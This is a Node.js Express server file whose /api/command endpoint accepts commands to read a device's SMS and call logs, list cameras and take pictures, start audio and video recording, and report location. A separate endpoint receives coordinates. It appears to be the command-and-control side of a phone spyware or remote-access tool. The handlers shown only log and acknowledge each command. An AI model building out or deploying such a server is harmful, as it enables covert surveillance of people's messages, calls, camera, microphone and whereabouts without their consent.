const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ For testing connection
app.post('/api/test', (req, res) => {
  console.log('Test Data:', req.body);
  res.send('Test endpoint working!');
});

// ✅ Command handler
app.post('/api/command', (req, res) => {
  const { cmd, payload } = req.body;
  console.log(`Received command: ${cmd}`);

  switch (cmd) {
    case 'getIP':
      // This will just log; actual data should come from device
      console.log('IP request from device');
      res.send('Command received: getIP');
      break;
    case 'deviceInfo':
      console.log('Device info requested');
      res.send('Command received: deviceInfo');
      break;
    case 'camList':
      console.log('Camera list requested');
      res.send('Command received: camList');
      break;
    case 'takepic':
      console.log(`Take picture command with: ${JSON.stringify(payload)}`);
      res.send('Command received: takepic');
      break;
    case 'getSMS':
      console.log('Read SMS inbox/sent');
      res.send('Command received: getSMS');
      break;
    case 'getLocation':
      console.log('Location requested');
      res.send('Command received: getLocation');
      break;
    case 'startAudio':
    case 'stopAudio':
    case 'startVideo':
    case 'stopVideo':
    case 'getCallLogs':
    case 'vibrate':
      console.log(`Command received: ${cmd}`);
      res.send(`Command received: ${cmd}`);
      break;
    default:
      res.status(400).send('Unknown command');
  }
});

// ✅ Location update
app.post('/api/location', (req, res) => {
  const { lat, lng } = req.body;
  console.log(`Received location: Lat ${lat}, Lng ${lng}`);
  res.send('Location received');
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
